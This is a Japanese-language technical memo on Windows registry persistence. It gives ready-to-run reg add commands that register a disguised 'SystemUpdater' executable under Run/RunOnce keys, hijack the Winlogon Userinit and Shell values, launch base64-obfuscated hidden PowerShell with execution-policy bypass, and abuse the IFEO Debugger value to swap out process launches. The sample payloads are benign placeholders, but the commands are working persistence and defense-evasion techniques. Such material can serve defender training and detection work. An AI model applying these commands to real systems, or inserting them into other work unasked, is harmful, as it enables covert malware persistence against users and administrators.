# レジストリとは
Windows OSの動作に必要なシステム設定、インストールされたソフトウェア、ハードウェア構成、ユーザー情報などを一元的に記録・管理する階層構造を持つデータベース。

## Step1 Run, RunOnce
Runキーはサインイン時に特定のレジストリパスに登録されたプログラムを自動で実行させる。  
RunOnceキーはサインイン時に実行されるが、実行後に自動的にレジストリから削除される。
```powershell
# HKLM 全ユーザーのサインイン時に有効、管理者権限が必要
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /t REG_SZ /d "C:\temp\systemUpdater.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SystemUpdater" /t REG_SZ /d "C:\temp\systemUpdater.exe" /f
# HKCU ログイン中ユーザーのサインイン時に有効
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /t REG_SZ /d "C:\temp\systemUpdater.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SystemUpdater" /t REG_SZ /d "C:\temp\systemUpdater.exe" /f
# 削除
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /f
```
## Step2 Userinit, Shell
```powershell
# userinit.exeに続き、自身のプログラムを登録
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,cmd.exe /c echo Userinit_Triggered > C:\Temp\userinit_success.txt" /f
# explorer.exeに続き、自身のプログラムを登録
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "C:\Windows\system32\explorer.exe,cmd.exe /c echo Shell_Triggered > C:\Temp\shell_success.txt" /f
```
## Step3 難読化
実行するコマンドをbase64エンコードしてUserinitに読み込ませる。
```powershell
# base64エンコードの準備
$c = <任意のコマンド>
$b = [System.text.encoding]::unicode.getbytes($c)
$e = [Convert]::ToBase64String($b)
write-host $e
# 登録
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,powershell -ep bypass -nop -w hidden -e <Base64エンコードされたコマンド> /f
```

## IFEOの悪用
IEFOのDebuggerを悪用し、本来起動するプロセスを他のものに差し替える。  
SilentProcessExitを使えばプロセス終了時にも任意のコマンドを実行可能。
```powershell
# Excelの起動を電卓に差し替え
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\excel.exe" /v Debugger /t REG_SZ /d "calc.exe" /f
```
